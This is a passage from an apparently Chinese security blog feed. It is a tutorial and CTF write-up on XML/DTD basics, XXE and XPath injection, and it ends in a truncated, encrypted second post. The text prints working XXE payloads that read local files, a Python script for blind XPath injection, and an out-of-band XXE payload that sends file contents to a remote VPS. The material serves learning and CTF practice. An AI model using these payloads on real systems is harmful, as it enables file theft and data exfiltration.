class="name">heading</span>&gt;</span>Reminder<span class="tag">&lt;/<span class="name">heading</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">body</span>&gt;</span>Don&#x27;t forget me this weekend!<span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">note</span>&gt;</span></span><br></pre></td></tr></table></figure><p>这是包含 DTD 的 “note.dtd” 文件：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!ELEMENT <span class="keyword">note</span> (<span class="keyword">to</span>,<span class="keyword">from</span>,<span class="keyword">heading</span>,<span class="keyword">body</span>)&gt;</span></span><br><span class="line"><span class="meta">&lt;!ELEMENT <span class="keyword">to</span> (<span class="keyword">#PCDATA</span>)&gt;</span></span><br><span class="line"><span class="meta">&lt;!ELEMENT <span class="keyword">from</span> (<span class="keyword">#PCDATA</span>)&gt;</span></span><br><span class="line"><span class="meta">&lt;!ELEMENT <span class="keyword">heading</span> (<span class="keyword">#PCDATA</span>)&gt;</span></span><br><span class="line"><span class="meta">&lt;!ELEMENT <span class="keyword">body</span> (<span class="keyword">#PCDATA</span>)&gt;</span></span><br></pre></td></tr></table></figure><h2 id="为什么使用-DTD？"><a href="#为什么使用-DTD？" class="headerlink" title="为什么使用 DTD？"></a>为什么使用 DTD？</h2><p>通过 DTD，您的每一个 XML 文件均可携带一个有关其自身格式的描述。</p><p>通过 DTD，独立的团体可一致地使用某个标准的 DTD 来交换数据。</p><p>而您的应用程序也可使用某个标准的 DTD 来验证从外部接收到的数据。</p><p>您还可以使用 DTD 来验证您自身的数据。</p><h1 id="实体"><a href="#实体" class="headerlink" title="实体"></a>实体</h1><h2 id="重点一："><a href="#重点一：" class="headerlink" title="重点一："></a>重点一：</h2><p>实体分为两种，内部实体和外部实体，上面我们举的例子就是内部实体，但是实体实际上可以从外部的 dtd 文件中引用，我们看下面的代码：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=&quot;1.0&quot; encoding=&quot;ISO-8859-1&quot;?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">foo</span> [</span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ELEMENT <span class="keyword">foo</span> <span class="keyword">ANY</span> &gt;</span></span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY <span class="keyword">xxe</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;file:///c:/test.dtd&quot;</span> &gt;</span>]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">creds</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">user</span>&gt;</span><span class="symbol">&amp;xxe;</span><span class="tag">&lt;/<span class="name">user</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">pass</span>&gt;</span>mypass<span class="tag">&lt;/<span class="name">pass</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">creds</span>&gt;</span></span><br></pre></td></tr></table></figure><p>这样对引用资源所做的任何更改都会在文档中自动更新,非常方便（方便永远是安全的敌人）</p><p>当然，还有一种引用方式是使用 引用公用 DTD 的方法，语法如下：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE 根元素名称 <span class="keyword">PUBLIC</span> “DTD标识名” “公用DTD的URI”&gt;</span></span><br></pre></td></tr></table></figure><p>这个在我们的攻击中也可以起到和 SYSTEM 一样的作用</p><h2 id="重点二："><a href="#重点二：" class="headerlink" title="重点二："></a>重点二：</h2><p>我们上面已经将实体分成了两个派别（内部实体和外部外部），但是实际上从另一个角度看，实体也可以分成两个派别（通用实体和参数实体）</p><p><strong>1.通用实体</strong><br>用 &amp;实体名; 引用的实体，他在DTD 中定义，在 XML 文档中引用</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;</span> </span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">updateProfile</span> [<span class="meta">&lt;!ENTITY <span class="keyword">file</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;file:///c:/windows/win.ini&quot;</span>&gt;</span> ]&gt;</span> </span><br><span class="line"><span class="tag">&lt;<span class="name">updateProfile</span>&gt;</span>  </span><br><span class="line">    <span class="tag">&lt;<span class="name">firstname</span>&gt;</span>Joe<span class="tag">&lt;/<span class="name">firstname</span>&gt;</span>  </span><br><span class="line">    <span class="tag">&lt;<span class="name">lastname</span>&gt;</span><span class="symbol">&amp;file;</span><span class="tag">&lt;/<span class="name">lastname</span>&gt;</span>  </span><br><span class="line">    ... </span><br><span class="line"><span class="tag">&lt;/<span class="name">updateProfile</span>&gt;</span></span><br></pre></td></tr></table></figure><p><strong>2.参数实体：</strong><br>1)使用 % 实体名(这里面空格不能少) 在 DTD 中定义，并且只能在 DTD 中使用 %实体名; 引用<br>(2)只有在 DTD 文件中，参数实体的声明才能引用其他实体<br>(3)和通用实体一样，参数实体也可以外部引用</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!ENTITY % <span class="keyword">an-element</span> <span class="string">&quot;&lt;!ELEMENT mytag (subtag)&gt;&quot;</span>&gt;</span> </span><br><span class="line"><span class="meta">&lt;!ENTITY % <span class="keyword">remote-dtd</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;http://somewhere.example.org/remote.dtd&quot;</span>&gt;</span> </span><br><span class="line">%an-element; %remote-dtd;</span><br></pre></td></tr></table></figure><p><strong>参数实体在我们 Blind XXE 中起到了至关重要的作用</strong></p><h1 id="xpath基础知识"><a href="#xpath基础知识" class="headerlink" title="xpath基础知识"></a>xpath基础知识</h1><h2 id="什么是-XPath"><a href="#什么是-XPath" class="headerlink" title="什么是 XPath?"></a>什么是 XPath?</h2><ul><li>XPath 使用路径表达式在 XML 文档中进行导航</li><li>XPath 包含一个标准函数库</li><li>XPath 是 XSLT 中的主要元素</li><li>XPath 是一个 W3C 标准</li></ul><h2 id="XPath-路径表达式"><a href="#XPath-路径表达式" class="headerlink" title="XPath 路径表达式"></a>XPath 路径表达式</h2><p>XPath 使用路径表达式来选取 XML 文档中的节点或者节点集。这些路径表达式和我们在常规的电脑文件系统中看到的表达式非常相似。</p><h2 id="XPath-标准函数"><a href="#XPath-标准函数" class="headerlink" title="XPath 标准函数"></a>XPath 标准函数</h2><p>XPath 含有超过 100 个内建的函数。这些函数用于字符串值、数值、日期和时间比较、节点和 QName 处理、序列处理、逻辑值等等。</p><h1 id="XPATH注入原理"><a href="#XPATH注入原理" class="headerlink" title="XPATH注入原理"></a>XPATH注入原理</h1><p>XPath 注入利用 XPath 解析器的松散输入和容错特性，能够在 URL、表单或其它信息上附带恶意的 XPath 查询代码，以获得高权限信息的访问权。</p><p>XPath注入类似于SQL注入，当网站使用未经正确处理的用户输入查询 XML 数据时，可能发生 XPATH 注入，由于Xpath中数据不像SQL中有权限的概念，用户可通过提交恶意XPATH代码获取到完整xml文档数据</p><h1 id="例题"><a href="#例题" class="headerlink" title="例题"></a>例题</h1><h2 id="今年做的"><a href="#今年做的" class="headerlink" title="今年做的"></a>今年做的</h2><p>pentestlab</p><h3 id="第一题-xml-injection"><a href="#第一题-xml-injection" class="headerlink" title="第一题 xml injection"></a>第一题 xml injection</h3><p>发现accept xml</p><p><img src="/2022/08/17/xmlinjection/image-20220817151040061.png" alt="image-20220817151040061"></p><p>发现解析xml</p><p><img src="/2022/08/17/xmlinjection/image-20220817151156740.png" alt="image-20220817151156740"></p><p>构造注入</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">test</span>&gt;</span>2333<span class="tag">&lt;/<span class="name">test</span>&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">data</span> [</span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ELEMENT <span class="keyword">data</span> <span class="keyword">ANY</span>&gt;</span></span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY <span class="keyword">file</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;file:///etc/passwd&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">data</span>&gt;</span><span class="symbol">&amp;file;</span><span class="tag">&lt;/<span class="name">data</span>&gt;</span></span><br></pre></td></tr></table></figure><p>记得一定要url encode 不然后端解析会出错</p><h3 id="第二题-xpath-injection"><a href="#第二题-xpath-injection" class="headerlink" title="第二题 xpath injection"></a>第二题 xpath injection</h3><p><img src="/2022/08/17/xmlinjection/image-20220817160753861.png" alt="image-20220817160753861"></p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hacke<span class="string">r&#x27; or 1=1 or &#x27;</span><span class="string">&#x27;=&#x27;</span></span><br></pre></td></tr></table></figure><ul><li><code>&#39; and &#39;1&#39;=&#39;1</code> and you should get the same result.</li><li><code>&#39; or &#39;1&#39;=&#39;0</code> and you should get the same result.</li><li><code>&#39; and &#39;1&#39;=&#39;0</code> and you should not get any result.</li><li><code>&#39; or &#39;1&#39;=&#39;1</code> and you should get all results.</li></ul><h2 id="NPUCTF2020-ezlogin"><a href="#NPUCTF2020-ezlogin" class="headerlink" title="[NPUCTF2020]ezlogin"></a>[NPUCTF2020]ezlogin</h2><p><img src="/2022/08/17/xmlinjection/MyBlog\b1ue0cean.github.io\source_posts\xmlinjection\image-20220819024930877.png" alt="image-20220819024930877"></p><p>一眼就看出是搞XML</p><p>xpath盲注</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line">url=<span class="string">&#x27;http://ha1cyon-ctf.fun:30163/&#x27;</span></span><br><span class="line">sess=requests.session()</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">token</span>():</span><br><span class="line">    req=sess.get(url)</span><br><span class="line">    tok=re.findall(<span class="string">&#x27;&lt;input type=&quot;hidden&quot; id=&quot;token&quot; value=&quot;(.*)&quot; /&gt;&#x27;</span>,req.text)</span><br><span class="line">    <span class="keyword">return</span> tok[<span class="number">0</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">login</span>(<span class="params">username,password</span>):</span><br><span class="line">    data=<span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">&lt;username&gt;&#123;&#125;&lt;/username&gt;&lt;password&gt;&#123;&#125;&lt;/password&gt;&lt;token&gt;&#123;&#125;&lt;/token&gt;</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span>.<span class="built_in">format</span>(username,password,token())</span><br><span class="line"></span><br><span class="line">    req=sess.post(url+<span class="string">&#x27;login.php&#x27;</span>,data=data,headers = &#123;<span class="string">&#x27;Content-Type&#x27;</span>: <span class="string">&#x27;application/xml&#x27;</span>&#125;)</span><br><span class="line">    <span class="built_in">print</span>(req.text,req.status_code)</span><br><span class="line">    <span class="keyword">return</span> req</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># root</span></span><br><span class="line">payload=<span class="string">&quot;&#x27; or  substring(name(/*[position()=1]),&#123;&#125;,1)=&#x27;&#123;&#125;&#x27;  or &#x27;1&#x27; = &#x27;1&quot;</span></span><br><span class="line">ro=<span class="string">&#x27;root&#x27;</span></span><br><span class="line"></span><br><span class="line">payload=<span class="string">&quot;&#x27; or substring(name(/root/*[position()=1]),&#123;&#125;,1)=&#x27;&#123;&#125;&#x27;  or &#x27;1&#x27; = &#x27;1&quot;</span></span><br><span class="line">ro=<span class="string">&#x27;accounts&#x27;</span></span><br><span class="line"></span><br><span class="line">payload=<span class="string">&quot;&#x27; or substring(name(/root/accounts/*[position()=1]),&#123;&#125;,1)=&#x27;&#123;&#125;&#x27;  or &#x27;1&#x27; = &#x27;1&quot;</span></span><br><span class="line">ro=<span class="string">&#x27;user&#x27;</span></span><br><span class="line"></span><br><span class="line">payload=<span class="string">&quot;&#x27; or substring(name(/root/accounts/user/*[position()=2]),&#123;&#125;,1)=&#x27;&#123;&#125;&#x27;  or &#x27;1&#x27; = &#x27;1&quot;</span></span><br><span class="line"><span class="comment"># id username password</span></span><br><span class="line">ro=<span class="string">&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">payload=<span class="string">&quot;1&#x27; or substring(/root/accounts/user[id=2]/username,&#123;&#125;,1)=&#x27;&#123;&#125;&#x27; or &#x27;1&#x27;=&#x27;1&quot;</span></span><br><span class="line"><span class="comment"># guest adm1n</span></span><br><span class="line">ro=<span class="string">&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">payload=<span class="string">&quot;1&#x27; or substring(/root/accounts/user[id=2]/password,&#123;&#125;,1)=&#x27;&#123;&#125;&#x27; or &#x27;1&#x27;=&#x27;1&quot;</span></span><br><span class="line"><span class="comment">#cf7414b5bdb2e65ee43083f4ddbc4d9f gtfly123</span></span><br><span class="line">ro=<span class="string">&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">100</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> string.digits+string.ascii_letters+<span class="string">&#x27;*&#x27;</span>:</span><br><span class="line">        <span class="keyword">if</span> j==<span class="string">&#x27;*&#x27;</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&#x27;***************false&#x27;</span>)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        tmp=payload.<span class="built_in">format</span>(i,j)</span><br><span class="line"></span><br><span class="line">        req=login(tmp,<span class="string">&#x27;ad&#x27;</span>)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;非法操作&#x27;</span> <span class="keyword">in</span> req.text:</span><br><span class="line">            ro+=j</span><br><span class="line">            <span class="built_in">print</span>(ro)</span><br><span class="line">            <span class="keyword">break</span></span><br></pre></td></tr></table></figure><p>然后伪协议读一下就好 （大小写绕过一下</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?file=pHp:<span class="regexp">//</span>filter<span class="regexp">/convert.bASe64-encode/</span>resource=/flag</span><br></pre></td></tr></table></figure><h2 id="去年做的"><a href="#去年做的" class="headerlink" title="去年做的"></a>去年做的</h2><h2 id="web373"><a href="#web373" class="headerlink" title="web373"></a>web373</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">libxml_disable_entity_loader</span>(<span class="literal">false</span>);</span><br><span class="line"><span class="variable">$xmlfile</span> = <span class="title function_ invoke__">file_get_contents</span>(<span class="string">&#x27;php://input&#x27;</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$xmlfile</span>))&#123;</span><br><span class="line">    <span class="variable">$dom</span> = <span class="keyword">new</span> <span class="title class_">DOMDocument</span>();</span><br><span class="line">    <span class="variable">$dom</span>-&gt;<span class="title function_ invoke__">loadXML</span>(<span class="variable">$xmlfile</span>, LIBXML_NOENT | LIBXML_DTDLOAD);</span><br><span class="line">    <span class="variable">$creds</span> = <span class="title function_ invoke__">simplexml_import_dom</span>(<span class="variable">$dom</span>);</span><br><span class="line">    <span class="variable">$ctfshow</span> = <span class="variable">$creds</span>-&gt;ctfshow;</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$ctfshow</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);    </span><br></pre></td></tr></table></figure><p>看样子要上传一个 恶意 XML 文件</p><p><img src="/2022/08/17/xmlinjection/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBAYjF1ZTBjZWFuQFJPSVPvvIZyM3Dlrp7kuaA=,size_20,color_FFFFFF,t_70,g_se,x_16#pic_center.png" alt="在这里插入图片描述"></p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE a [  </span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY <span class="keyword">xxe</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;file:///flag&quot;</span>&gt;</span> ]&gt;</span> </span><br><span class="line"><span class="tag">&lt;<span class="name">t</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">ctfshow</span>&gt;</span><span class="symbol">&amp;xxe;</span><span class="tag">&lt;/<span class="name">ctfshow</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">t</span>&gt;</span></span><br></pre></td></tr></table></figure><h2 id="web374-无回显读取本地敏感文件-Blind-OOB-XXE"><a href="#web374-无回显读取本地敏感文件-Blind-OOB-XXE" class="headerlink" title="web374  (无回显读取本地敏感文件(Blind OOB XXE))"></a>web374  (无回显读取本地敏感文件(Blind OOB XXE))</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">libxml_disable_entity_loader</span>(<span class="literal">false</span>);</span><br><span class="line"><span class="variable">$xmlfile</span> = <span class="title function_ invoke__">file_get_contents</span>(<span class="string">&#x27;php://input&#x27;</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$xmlfile</span>))&#123;</span><br><span class="line">    <span class="variable">$dom</span> = <span class="keyword">new</span> <span class="title class_">DOMDocument</span>();</span><br><span class="line">    <span class="variable">$dom</span>-&gt;<span class="title function_ invoke__">loadXML</span>(<span class="variable">$xmlfile</span>, LIBXML_NOENT | LIBXML_DTDLOAD);</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);  </span><br></pre></td></tr></table></figure><p>payload</p><p>现在我们的vps上挂一个dtd</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">convert</span> [ </span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY &amp;#x25 <span class="keyword">remote</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;http://8.135.132.214/fuck.dtd&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">%remote;%int;%send;</span></span><br><span class="line"><span class="meta">]&gt;</span></span><br></pre></td></tr></table></figure><p>读出flag  然后加载我们的remote dtd      然后转发给我们的vps 9999 端口</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">test</span> [</span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY % <span class="keyword">file</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;php://filter/read=convert.base64-encode/resource=/flag&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY % <span class="keyword">aaa</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;http://8.135.132.214:8888/fuck.dtd&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">%aaa;</span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">root</span>&gt;</span>123<span class="tag">&lt;/<span class="name">root</span>&gt;</span></span><br></pre></td></tr></table></figure><blockquote><p>我们从 payload 中能看到 连续调用了三个参数实体 %remote;%int;%send;，这就是我们的利用顺序，%remote 先调用，调用后请求远程服务器上的 fuck.dtd ，有点类似于将 fuck.dtd 包含进来，然后 %int 调用 fuck.dtd 中的 %file, %file 就会去获取服务器上面的敏感文件，然后将 %file 的结果填入到 %send 以后(因为实体的值中不能有 %, 所以将其转成html实体编码 &#37;)，我们再调用 %send; 把我们的读取到的数据发送到我们的远程 vps 上，这样就实现了外带数据的效果，完美的解决了 XXE 无回显的问题。</p></blockquote><h2 id="论各种语言中xee的可利用性"><a href="#论各种语言中xee的可利用性" class="headerlink" title="论各种语言中xee的可利用性"></a>论各种语言中xee的可利用性</h2><p><img src="/2022/08/17/xmlinjection/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBAYjF1ZTBjZWFuQFJPSVPvvIZyM3Dlrp7kuaA=,size_16,color_FFFFFF,t_70,g_se,x_16.png" alt="在这里插入图片描述"></p><h3 id="结合phar进行rce"><a href="#结合phar进行rce" class="headerlink" title="结合phar进行rce"></a>结合phar进行rce</h3><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://mohemiv.com/all/exploiting-xxe-with-local-dtd-files/">https://mohemiv.com/all/exploiting-xxe-with-local-dtd-files/</a><br><a href="https://blog.csdn.net/weixin_39927799/article/details/110723346">https://blog.csdn.net/weixin_39927799/article/details/110723346</a><br><a href="https://github.com/Stakcery/Web-Security/tree/main/XXE">https://github.com/Stakcery/Web-Security/tree/main/XXE</a><br><a href="https://xz.aliyun.com/t/3357">https://xz.aliyun.com/t/3357</a></p><p><a href="https://xz.aliyun.com/t/10774">https://xz.aliyun.com/t/10774</a></p><p>[xpath](<a href="https://xz.aliyun.com/t/7791">XPATH注入学习 - 先知社区 (aliyun.com)</a>)</p><p>reference</p>]]></content>
    
    
    <summary type="html">&lt;p&gt;一年前写的文章 重新加工一下 权当复习了&lt;/p&gt;
&lt;p&gt;建议先好好看看 &lt;a href=&quot;https://www.runoob.com/xml/xml-usage.html&quot;&gt;XML 用途 | 菜鸟教程 (runoob.com)&lt;/a&gt;  &lt;a href=&quot;https://www.runoob.com/dtd/dtd-tutorial.html&quot;&gt;DTD 教程 | 菜鸟教程 (runoob.com)&lt;/a&gt;一切都要从基础开始学起&lt;/p&gt;</summary>
    
    
    
    <category term="xml" scheme="http://example.com/categories/xml/"/>
    
    
    <category term="xml" scheme="http://example.com/tags/xml/"/>
    
  </entry>
  
  <entry>
    <title>安全面经读后总结</title>
    <link href="http://example.com/2022/08/17/%E9%9D%A2%E8%AF%95/"/>
    <id>http://example.com/2022/08/17/%E9%9D%A2%E8%AF%95/</id>
    <published>2022-08-16T20:10:03.000Z</published>
    <updated>2022-08-23T19:11:24.389Z</updated>
    
    <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <script id="hbeData" type="hbeData" data-hmacdigest="adad6b3d8b7b34e72e91b93f15757b8343be56c5ae656f0fd402d20614b90be1">991ab7d2bd03f4d5f10ea7e59fdd190b55b2e3305de44db18d8923ad9288310ffbdb79449bc0fbe531e6535f4bfb127c51bce34c3d7e70470882c18e9021c7c18e7977bd36ffd7d8d5e45959db7890439721a9c2574d14a58a9fc71a82773b5ce1843cd575ac5b891ead3ec25189fbe09e8169a5cb0cdd2a317dfca88452889c5e8ec389a42a429cf8a55fa447a7871218c144a14bc07905241c752c23190fdc01a902e652ad893a068fc9c6cee7ec6d897469f33f08d6cd3bcda9a3747345a75adc4bbdfd654e90d1d3a5a298bc54347ba62248c5997d1e4cb0087e8a207c8f8203dc4f8b53e00da80c4330b25c1e2c30ab3dd6b1e432d181bdfec7b57b9c74cfc8cc0b08648ad50e4aedf1717edfab7fe1a976bd86b032fdb486c39acb48c7fac2a3613fe8bacb61b873fa4614f38b1a57a5accc54e0c783bccef2c648a935385f52acf7a114d76ed7e549ef19f9a0cfb1be876318263beb590c4743aee593b89840042ad664a00cf1a5e8c7553bef806884bbc08451bbfe22fe5a52d411de58b10b1345e75d63b88accc1cd8f66dc7da29000c7cb22952574017f4b82563f08b22822f6d0936cbfc5200312c69a40f63139c9a7de44ea5a0991e9ec074a8e67f449e905574bcf895856070665efddc4bfe503af87619710ccda85db08e4e288a62c0e176f0638710bd21be5dccd92ba63c79c59992b8cda185d695cf3708f0dc75314205beff86c10814f00b544f9181e80d0b7558e9ff706090821de2746ff48fa1b282600397c5cb258d08f9cdbb6a4aac2459cf3c2bb25fbfd5ef8dcd8b522f07b0cc2a971cf87789de601a414a292a9bb1c775028532f2520280555ea47c8b4fb139d67c9f1ce5c4d43dd23636be6a6c9e9572c8368ef9863c575a8fd5d6ce5649c44bd91f422fc9b39084db923c06e0aea29d64a8f0fee05a1e440db41bce2960b6e6b34b84be5555cb25bd187db51640557c39b2940452a12addd9fa9e10a13fcb6c1f2d7caaa303c3aca4661d8a3d2c7c6d69aebb6a80b7157d93671fb635d78816d5abea302f19b42948a0f1be7237a1db1d52e0e0e755f6973da7746cdcb1cd63be6b1b5be83ded257cb440524fb39a5a550deee734aa280f908ecb7126bab649b4ee715e59a818bac0c34126fbc313c185eb4ebe467039b1d4951c95d87f1f6176138a143aed9f6b207c4ffd88595b80a911fcbfa55f4504813e4f7817ff7a64ca49bd3d9584f078132eb6e5606e2e9ed0fb0270626cc53da06f563a16e288f49bcd5d00c95e49667ee363504ca28606806efd1e927551d8faa37be5dfc357afef75c30b5fc4b68d612ec13f451518ba33b85153640e9e44970848d74f7ca64d1a1054994e22401d45fe0f1a7a2115e5dda9c44c637734f881ef23b94772f270e4594d371666db44da51dc4d602a95f6c4391246cb32943a307d14833227b1ea95f8f254ab427521ba95137c56ccce7dc34fcba1970ebcadaddabe75d080ca8e3f505c6fb15d94f9c957ef5046a4941c7fe00b331e306223d415d0794fbc906c01bf7d7f3c6983e70f340d084d1f812f6d1558a3cbf54f5091624ef39741cc10746315df6e7feb4ff97cc299a3f77f49d821368447d4537a3728e2f0ac87c8ec048ae0367d0b7b835b79542a7f3582f7d046874e7c7bbcf1d88b4c4a9f723097de1a3b76c88dc009fdd738b3845241749336b08e75eb7fac9c16cd866edb1b1206343e0f0485474af0f3e70d5cbc37bc2c1251ffd6656aa5df5d69adbe24c89debc823300dc3e923aac170b64c579a77fdf797bc55bb69657d111c07db9ac45dad4cb10dac1bc1b6a7b2563eb906abe907eddbb77318828dc3058b78fea536fa2071639f33a77f62f9aa2821c6400dd70a08f466c2a73f138b55e119b49dece01fbad6cbf37c09a1fbf4037ba1a18411b05cd3ce28f1519965a1bc0c7e56eb572e9b654f1e22cb44bd0132b5721e6eb7a336861f74340b5c5e47630c4e5dddbf7aaa1a7ec8603c42c6fdf815c74c437ba7f9916eb3cab42613